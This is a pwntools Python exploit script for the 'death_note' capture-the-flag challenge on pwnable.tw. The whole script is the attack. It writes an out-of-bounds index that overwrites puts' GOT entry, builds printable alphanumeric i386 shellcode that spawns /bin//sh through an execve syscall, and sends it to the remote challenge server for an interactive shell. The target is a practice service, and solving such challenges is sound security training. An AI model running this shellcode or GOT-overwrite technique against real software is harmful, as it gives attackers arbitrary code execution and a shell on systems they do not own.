from pwn import *
context.os     = "linux"
context.arch   = "i386"
context.endian = "little"

note_start = 0x0804A060
puts_got   = 0x0804A020
back = (puts_got - note_start) // 4

assembly = """
    /* Push int 0x80 at the end of the rest of the code */
    push edx
    pop esp

    popa
    popa

    and eax, 0x31313131
    and eax, 0x46464646
    dec eax
    
    xor eax, 0x22222251
    xor eax, 0x77775d63

    pop ecx
    pop ecx
    push eax

    popa

    /* NORMAL */
    and eax, 0x31313131
    and eax, 0x46464646
    push eax
    push eax
    pop ecx
    pop edx

    push 0x68
    push 0x732f2f2f
    push 0x6e69622f

    push 0x4646462b
    pop eax
    and eax, 0x3131314b

    push esp
    pop ebx
"""

shellcode = asm(assembly)
print(shellcode.decode())

#r = process("./death_note")
#r = process(["gdbserver", "localhost:1234", "./death_note"])
r = remote("chall.pwnable.tw", port=10201)

r.recvuntil("choice :")
r.sendline("1")
r.recvuntil("Index :")
r.sendline(str(back))
r.recvuntil("Name :")
r.sendline(shellcode)
r.interactive()
